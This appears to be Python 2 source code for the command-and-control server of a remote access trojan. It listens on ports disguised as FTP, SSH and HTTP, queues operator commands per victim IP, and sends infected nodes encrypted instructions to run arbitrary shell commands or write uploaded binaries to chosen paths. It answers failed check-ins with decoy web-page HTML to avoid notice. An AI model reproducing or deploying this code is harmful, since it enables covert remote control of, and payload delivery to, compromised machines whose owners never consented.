import os
import select
from rat_server.socks import Ftp_Socket
from rat_server.socks import Ssh_Socket
from rat_server.socks import Http_Socket
from rat_server.socks import Client_Socket
from rat_server.encryption import Encryption


class Server:
    def __init__(self, ftp=True, ssh=True, http=True, client_port=4444):
        self.enc = Encryption()
        self.node_secret_keys = {}
        self.sockets = []
        self.commands = {}

    def _create_sockets(self, ftp=True, ssh=True, http=True, client_port=4444):
        self.client = Client_Socket()
        self.client.bind(("127.0.0.1", client_port))
        self.client.listen(0)
        if ftp:
            self.ftp = Ftp_Socket()
            self.ftp.bind(("", 21))
            self.ftp.listen(0)
            self.sockets.append(self.ftp)
        if ssh:
            self.ssh = Ssh_Socket()
            self.ssh.bind(("", 22))
            self.ssh.listen(0)
            self.sockets.append(self.ssh)
        if http:
            self.http = Http_Socket()
            self.http.bind(("", 80))
            self.http.listen(0)
            self.sockets.append(self.http)
        if len(self.sockets) < 1:
            raise Exception("No Listening Socket")

    def _add_command(self, msg, conn):
        if msg["target"] in self.commands:
            self.commands[msg["target"]].append(msg)
        else:
            self.commands[msg["target"]] = [msg]
        print msg
        conn.send({"response":"%s %s" % (msg["command"], msg["target"])})
        conn.close()
        return 0

    def _handle_client(self, conn, addr):
        msg = conn.recv(4096)
        if "command" not in msg: # must have command
            conn.send({"response":"command not specified"})
            conn.close()
            return -1
        if msg["command"] == "print status":
            response = ""
            for target in self.commands:
                if target in self.node_secret_keys:status = "connected"
                else:status = "disconnected"
                response += "\n%s : %s\n" % (target, status)
                for cmd in self.commands[target]:
                    response += "\tcommand: %s\n" % cmd["command"]
            print response
            conn.send({"response":response})
            conn.close()
            return 0
        if "target" not in msg: # must have target
            conn.send({"response":"target not specified"})
            conn.close()
            return -1
        if msg["command"] == "connect" and "target" in msg:
            return self._add_command(msg, conn)
        if msg["target"] not in self.node_secret_keys: # must be connected
            conn.send({"response":"not connected to %s" % msg["target"]})
            conn.close()
            return -1
        elif msg["command"] == "disconnect" and "target" in msg:
            return self._add_command(msg, conn)
        elif msg["command"] == "upload" and "target" in msg and "binary" in msg:
            return self._add_command(msg, conn)
        elif msg["command"] == "system" and "target" in msg and "cmd" in msg:
            return self._add_command(msg, conn)
        else:
            conn.send({"response":"invalid command"})
            conn.close()
            return -1

    def _handle_node(self, conn, addr):
        try:
            conn.recv(4096)
            if addr[0] in self.node_secret_keys:
                secret_key = self.node_secret_keys[addr[0]]
                try:cmd = self.commands[addr[0]].pop()
                except:cmd=None
                if not cmd:
                    raise Exception("no command")
                elif cmd["command"] == "disconnect":
                    conn.send("disconnect\n", secret_key)
                    del self.node_secret_keys[addr[0]]
                elif cmd["command"] == "system":
                    conn.send("system%s/%s\n" % (len(cmd["cmd"]), cmd["cmd"]), secret_key)
                elif cmd["command"] == "upload":
                    if not os.path.isfile(cmd["binary"]):
                        raise Exception("invalid file")
                    data =  open(cmd["binary"], "r").read()
                    conn.send("upload%s/%s/%s%s>\n" % (
                        len(cmd["dest"]), len(data),
                        cmd["dest"], data),
                        secret_key)
                else:
                    raise Exception("not a command")
            else:
                connect = False
                if addr[0] in self.commands:
                    for cmd in self.commands[addr[0]]:
                        if cmd["command"] == "connect":
                            connect = True
                if connect:
                    self.commands[addr[0]] = [] # reset all cmds after connecting
                    gen, my_pubkey = self.enc.auth_init()
                    conn.send("connect<div>%s</div>%s" % (gen, my_pubkey))
                    client_pubkey = conn.recv(4096)
                    secret = self.enc.auth_gen_secret_key(client_pubkey)
                    self.node_secret_keys[addr[0]] = secret
                    conn.close()
                else:
                    raise Exception("no command")
            conn.close()
        except Exception as e:
            print e
            conn.send('<ul>\n<li> <a href="faq.html">FAQ</a></li>\n<li>&nbsp;</li>\n<li> <a href="advertise.html">Your ad here</a></li></ul>')
            conn.close()

    def run(self):
        self._create_sockets()
        try:
            while True:
                read, write, excep = select.select(self.sockets + [self.client], [], [])
                for sock in read:
                    conn, addr = sock.accept()
                    if sock == self.client:
                        self._handle_client(conn, addr)
                    else:
                        self._handle_node(conn, addr)
        except KeyboardInterrupt:
            exit("bye")
